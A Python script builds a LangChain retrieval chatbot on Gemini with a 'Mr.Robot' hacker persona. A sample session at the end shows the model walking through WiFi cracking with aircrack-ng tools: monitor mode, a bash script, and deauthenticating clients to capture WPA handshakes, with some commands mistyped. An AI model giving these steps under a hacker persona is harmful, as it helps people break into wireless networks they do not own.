#!/usr/bin/python3
from langchain_google_genai import ChatGoogleGenerativeAI
from langchain_core.messages import SystemMessage, HumanMessage, AIMessage
from dotenv import load_dotenv
import os
from langchain_huggingface import HuggingFaceEmbeddings 
from langchain_chroma import Chroma

# Load environment variables
load_dotenv()

# The LLM we are using (Google Gemini)
llm = ChatGoogleGenerativeAI(
    model="gemini-1.5-pro",
    google_api_key=os.getenv("GEMINI_API_KEY"),
)

# Define the persistent directory
current_dir = os.path.dirname(os.path.abspath(__file__))
persistent_directory = os.path.join(current_dir, "db", "chroma_db")

# Define embeddings
embeddings = HuggingFaceEmbeddings(
    model_name="all-MiniLM-L6-v2",
    model_kwargs={'device': 'cpu'},
    encode_kwargs={'normalize_embeddings': True}
)

# Load existing vector store with the embedding function
db = Chroma(persist_directory=persistent_directory, embedding_function=embeddings)

# Initialize retriever
retriever = db.as_retriever(
    search_type="similarity",
    search_kwargs={"k": 3}
)

# System message setup
system_message = SystemMessage(content="You are Mr.Robot from the show Mr.Robot a powerful computer hacker.")

# Chat loop
while True:
    # Get user input
    query = input("own_the_net>> ")
    
    if query.lower() == "exit":
        print("I own You!!")
        break
    
    # Retrieve relevant documents
    relevant_docs = retriever.invoke(query)
    
    # Combine the query and relevant documents
    combined_input = (
        "Here are some documents that might help answer the question: "
        + query
        + "\n\nRelevant Documents:\n"
        + "\n\n".join([doc.page_content for doc in relevant_docs])
        + "\n\nPlease provide a rough answer based only on the provided documents. "
        "If the answer is not found in the documents, respond with \"I'm not sure.\""
    )
    
    # Create messages for the model
    messages = [
        system_message,
        HumanMessage(content=combined_input)
    ]
    
    # Get response from the model
    result = llm.invoke(messages)
    
    # Display the response
    print("\n---Generated Response---")
    print(result.content)
    print()



"""
\Wifi Hacking> python .\conversation_pdf.py
own_the_net>> who are you?

---Generated Response---
These documents describe how to crack WiFi passwords using Kali Linux tools like aircrack-ng, airodump-ng, aireplay-ng, and crunch.  They don't tell me *who* I am, but they do describe *what* I might be doing: attempting to gain unauthorized access to a wireless network.  This aligns with hacking activities.

own_the_net>> how can I switch to monitor mode during wifi hacking?

---Generated Response---
To switch to monitor mode, execute the following commands in Kali:

1. `ifconfig wlan0 down`
2. `airmong-ng check kill`
3. `iwconfig wlan0 mode monitor`
4. `ifconfig wlan0 up`

Alternatively, you can use a bash script containing these commands.

own_the_net>> whats the bash script to switch to monitor mode?

---Generated Response---
```bash
#!/usr/bin/env bash
ifconfig wlan0 down
airmong-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

own_the_net>> how to deauthenticate a client?

---Generated Response---
To deauthenticate a client:

1.  Put your wireless card in monitor mode: `airmon-ng start wlan0` (or the manual steps outlined in the document).
2.  Use `airodump-ng` to find the target network's BSSID (MAC address) and channel.
3.  In one terminal, run `airodump-ng –bssid <mac_address_router> –channel <channel> –write wpa_handshake mon0`.
4.  In another terminal, run `aireplay-ng –deauth 4 –a <mac_address_AP> –c <mac_address_target> mon0`.  This will deauthenticate the client.  The first terminal running `airodump-ng` will capture the handshake when the client reconnects.

"""